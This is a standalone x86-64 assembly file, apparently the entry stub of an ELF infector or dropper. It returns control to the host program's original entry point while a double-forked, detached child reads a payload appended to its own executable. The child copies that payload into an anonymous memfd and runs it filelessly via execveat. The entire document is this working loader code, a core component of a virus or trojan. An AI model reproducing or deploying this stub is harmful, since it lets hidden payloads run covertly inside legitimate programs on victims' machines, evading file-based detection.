.intel_syntax noprefix
.global _start
.code64
.text
_start:
    push rbp
    mov rbp, rsp
    push rax                                        # preserve rax

    push 57                                         # sys_fork
    pop rax
    syscall

    test eax, eax
    jz second_fork

    pop rax                                         # restore rax
    mov rsp, rbp                                    # this is the parent, return to the OEP
    pop rbp
    ret 

second_fork:                                        # fork again so we get reparented to init
    push 57                                         # sys_fork
    pop rax
    syscall

    test eax, eax
    jnz exit

    push 319                                        # sys_memfd_create
    pop rax
    push 0x7a7978                                   # "xyz"
    mov rdi, rsp
    push 1                                          # MFD_CLOEXEC
    pop rsi
    syscall
    test rax, rax
    js exit
    push rax                                        # save mem_fd

    # open current process
    push 2                                          # sys_open
    pop rax
    mov rdi, 0x6578652F666C                         # /proc/self/exe
    push rdi
    mov rdi, 0x65732F636F72702F
    push rdi
    mov rdi, rsp
    xor esi, esi                                    # flags = O_RDONLY = 0
    syscall
    pop r12
    pop r12
    test rax, rax
    js exit
    push rax                                        # save self_fd

    # seek to the end minus 4 bytes
    pop rdi                                         # fd
    push rdi
    push -4                                         # -4 bytes offset
    pop rsi
    push 2
    pop rdx                                         # SEEK_END
    push 8
    pop rax                                         # sys_lseek
    syscall

    # read a length
    xor eax, eax                                    # sys_read
    pop rdi                                         # fd
    push rdi
    push rax
    mov rsi, rsp                                    # buf
    push 4                                          # count
    pop rdx
    syscall

    # seek to the end minus 4 bytes, minus the length...
    pop rdx
    pop rdi                                         # fd
    push rdi
    push rdx
    push -4                                         # -4 bytes offset
    pop rsi
    sub rsi, rdx
    push 2
    pop rdx                                         # SEEK_END
    push 8
    pop rax                                         # sys_lseek
    syscall

    xor eax, eax
    xor r12, r12                                    # counter = 0
sendfile_loop:
    add r12, rax
    push 40
    pop rax                                         # sys_sendfile
    xor edx, edx                                    # *offset = null
    pop r10
    pop rsi                                         # in_fd = self fd
    pop rdi                                         # out_fd = mem_fd
    push rdi
    push rsi
    push r10
    sub r10, r12                                    # count = size - count
    syscall
    test rax, rax
    js exit
    jnz sendfile_loop

    push 322                                        # stub_execveat
    pop rax
    pop rdx
    pop rdx
    pop rdi                                         # fd = mem_fd
    push 0
    mov rsi, rsp                                    # pathname ""
    xor edx, edx                                    # argv = NULL
    xor r10, r10                                    # envp = NULL
    mov r8, 0x1000                                  # flags = AT_EMPTY_PATH
    syscall

exit:
    xor edi, edi                                    # exit code 0
    push 60                                         # sys_exit
    pop rax
    syscall
